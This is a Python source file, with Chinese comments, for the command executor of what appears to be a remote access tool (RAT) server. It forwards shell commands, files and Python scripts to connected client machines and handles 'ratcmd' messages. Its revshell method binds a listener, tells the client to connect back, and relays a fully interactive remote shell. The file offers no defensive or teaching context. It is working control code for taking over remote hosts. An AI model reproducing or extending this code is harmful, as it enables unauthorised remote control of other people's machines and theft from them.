import glob
import json
import os
import shlex
import socket
import sys
import threading
from functools import partial

from core.utils.common_util import scan_args, get_time, format_dict, parse
from core.utils.logger import logger
from server.config.config import SCRIPT_PATH
from core.utils.server_util import secure_filename, replace_spaces, read_first_line, write


class CommandExecutor:
    def __init__(self, conn, server):
        self.conn = conn
        self.server = server

    def process_command(self, cmd):
        """
        处理命令并返回执行函数
        :param cmd: 要处理的命令
        :return: 可执行函数
        """

        # 检查是否是ratcmd命令
        if cmd.startswith('ratcmd '):
            return partial(self._handle_ratcmd, cmd)


        name, arg = parse(cmd)

        # 检查是否是Command类的方法
        if hasattr(self, name) and callable(getattr(self, name)):
            return partial(getattr(self, name), arg)

        # 检查是否是别名
        if self.server.alias_manager.aliases.get(name):
            try:
                alias_cmd = self.server.alias_manager.get_alias_command(name, arg)
                return partial(self.conn.send_command, alias_cmd)
            except Exception as e:
                return partial(lambda e: [(0, str(e))], e)

        # 默认发送原始命令
        return partial(self.conn.send_command, cmd)

    def upload(self, filename):
        """
        上传文件
        :param filename: 文件名
        """
        if os.path.isfile(filename):
            try:
                for i in self.conn.send_file(filename):
                    yield i
            except:
                self.conn.commands.clear()
                raise
        else:
            raise FileNotFoundError('File does not exist')

    def exec(self, filename):
        """
        发送python脚本
        :param filename: 文件名
        """
        # 显示脚本列表

        if not filename:
            scripts = []
            for file in glob.iglob(os.path.join(SCRIPT_PATH, '**/*.py'), recursive=True):
                scripts.append(os.path.relpath(file, SCRIPT_PATH).replace('\\', '/'))
            yield 1, '\n'.join(scripts)
            return

        if filename == '--help':
            scripts = {}
            for file in glob.iglob(os.path.join(SCRIPT_PATH, '**/*.py'), recursive=True):
                script_key = os.path.relpath(file, SCRIPT_PATH).replace('\\', '/')
                script_value = read_first_line(file)
                scripts[script_key] = script_value
            yield 1, format_dict(scripts, 25)
            return

        # 发送脚本
        filename = shlex.split(filename)  # 拆分脚本名和参数
        script_name = os.path.abspath(os.path.join(SCRIPT_PATH, filename[0]))  # 脚本名
        if not os.path.isfile(script_name):
            # 自动添加.py后缀
            script_path_with_extension = f"{script_name}.py"
            if os.path.isfile(script_path_with_extension):
                script_name = script_path_with_extension
            else:
                raise FileNotFoundError(f'File does not exist: {script_name}')
        with open(script_name, 'rt', encoding='utf-8') as f:
            try:
                func = partial(self.conn.send_command, f.read(), type='script', extra=scan_args(filename[1:]))
                for i in func():
                    yield i
            except UnicodeDecodeError:
                raise RuntimeError(f'Unable to process file: {script_name}')

    def history(self, arg):
        """
        显示历史记录
        :param arg: -f 显示详细信息 -c 清除记录
        """
        if arg in ['-f', '--full']:
            yield 1, json.dumps(self.conn.command_history, ensure_ascii=False, indent=2)
        elif arg in ['-c', '--clear']:
            self.conn.command_history.clear()
            yield 1, 'History cleared'
        else:
            yield 1, '\n'.join([cmd['command'] for cmd in self.conn.command_history])

    def save_result(self, command):
        """
        将命令结果写入本地文件
        """
        if not command:
            return 0, ''
        # func = self.server.process_command(command, self.conn, CommandExecutor(self.conn, self.server))
        func = self.process_command(command)
        filename = f'{replace_spaces(secure_filename(command))}_{self.conn.address[0]}_{get_time()}.txt'
        with open(filename, 'wt') as f:
            for i in func():
                f.write(i[1] + '\n')
        yield 1, 'Result saved to {}'.format(filename)

    def alias(self, arg):
        """管理命令别名"""
        if not arg:
            yield 1, format_dict(self.server.alias_manager.list_aliases())
            return

        try:
            if '=' in arg:
                # 添加或更新别名
                alias, cmd = [part.strip() for part in arg.split('=', 1)]
                self.server.alias_manager.add_alias(alias, cmd)
                yield 1, f'Alias added: {alias} -> {cmd}'
            else:
                raise ValueError("Missing '=' in alias definition")
        except Exception as e:
            raise ValueError(f"Invalid alias: {e}")

    def unalias(self, arg):
        """移除命令别名"""
        if not arg:
            raise ValueError("Missing alias name")

        try:
            self.server.alias_manager.remove_alias(arg)
            yield 1, f'Alias removed: {arg}'
        except KeyError as e:
            raise ValueError(f"Alias not found: {arg}")

    # def alias(self, arg):
    #     # 显示别名列表
    #     if not arg:
    #         yield 1, format_dict(self.server.aliases)
    #         return
    #     # 没有等号
    #     equal_mark_index = arg.find('=')
    #     if equal_mark_index == -1:
    #         raise SyntaxError('missing equal mark')
    #     # 拆分
    #     alias = arg[0:equal_mark_index].strip()
    #     cmd = arg[equal_mark_index + 1:].strip()
    #     # 判断是否有空值
    #     if not all([alias, cmd]):
    #         raise SyntaxError('null value not accepted')
    #     self.server.aliases[alias] = cmd
    #     self.server.save_aliases()
    #     yield 1, f'Alias added: {alias} -> {cmd}'
    #
    # def unalias(self, arg):
    #     if not arg:
    #         raise SyntaxError('missing alias name')
    #     if arg not in self.server.aliases:
    #         raise SyntaxError(f'alias does not exist: {arg}')
    #     self.server.aliases.pop(arg)
    #     self.server.save_aliases()
    #     yield 1, f'Alias removed: {arg}'

    def revshell(self, cmd):
        """
        打开一个可完全交互的shell，支持stdin
        """

        # 后台接收线程，接收数据并在前台显示，如果出现异常终止线程
        def recv():
            try:
                while 1:
                    data = rev_con.recv(1024)
                    if not data:
                        break
                    sys.stdout.write(data.decode('gbk'))
                    sys.stdout.flush()
            except socket.error as e:
                logger.error(f'Connection aborted: {e}')
                raise

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        addr = ('0.0.0.0', 0)
        s.bind(addr)

        # 服务端获取一个随机可用端口，并将其作为参数发送给客户端
        cmd += f'revshell {s.getsockname()[1]}'

        func = partial(self.conn.send_command, cmd)


        if func:
            for i in func():
                write(*i)

        s.listen(5)
        print('Listening on {}'.format(s.getsockname()))
        rev_con, addr = s.accept()
        print('Connection from {}'.format(addr))
        threading.Thread(target=recv).start()
        # line_sep = None
        if os.name == 'nt':
            line_sep = '\r\n'
        else:
            line_sep = '\n'

        while 1:
            try:
                cmd = input('>')  # 使用自定义提示符
                if cmd.lower() in ['exit', 'quit']:
                    rev_con.send(bytes('exit' + line_sep, encoding='gbk'))
                    break
                rev_con.send(bytes(cmd + line_sep, encoding='gbk'))
            except (EOFError, KeyboardInterrupt):  # 处理 Ctrl+C / Ctrl+D
                rev_con.send(bytes('exit' + line_sep, encoding='gbk'))
                break

        yield 1, 'Done'

    def _handle_ratcmd(self, cmd_text):
        """
        处理ratcmd命令 - 仅转发，不解析具体内容
        """
        try:
            # 简单验证是否是ratcmd格式
            if not cmd_text.strip().startswith('ratcmd '):
                yield 0, "Invalid ratcmd format"
                return

            # 直接转发给客户端，类型标记为'ratcmd'
            for result in self.conn.send_command(cmd_text, type='ratcmd'):
                yield result

        except Exception as e:
            yield 0, f"RATCMD Error: {str(e)}"

